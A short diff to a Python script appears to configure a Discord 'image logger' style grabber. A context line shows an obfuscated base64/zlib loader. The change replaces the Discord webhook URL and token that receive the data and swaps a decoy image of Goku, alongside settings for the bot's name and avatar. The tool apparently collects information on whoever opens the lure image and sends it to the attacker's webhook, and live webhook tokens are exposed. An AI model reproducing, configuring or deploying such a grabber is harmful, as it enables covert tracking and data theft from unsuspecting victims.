@@ -3,8 +3,8 @@ _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1429384548830937159/BnsjB5UhRc5xfAUAm2x0JR58BWqLFG9kXuNCowpCoXrGSOguja3ZEuSMe6cc9037m2KD",
-    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ6R6nL8RIItn-k7dkWNQedcHF-u0EyFZVKUQ&s",
+    "webhook": "https://discord.com/api/webhooks/1429978371881959474/5m1XOYFomM7d6W74-XEpDOuT45LZ1duxvHvNjpZk9lLT6y2K9awBc01n9iQW8husWyok",
+    "image": "https://static.wikia.nocookie.net/dragonballfighterz/images/b/b1/Goku_%28Super_Saiyan%29_Artwork.png/revision/latest?cb=20180914190656",
     "imageArgument": True,
     "username": "TrackOrd",
     "avatar_url": "https://github.com/mystixxx2/Image/blob/main/ChatGPT%20Image%2011%20oct.%202025,%2018_54_21.png?raw=true",
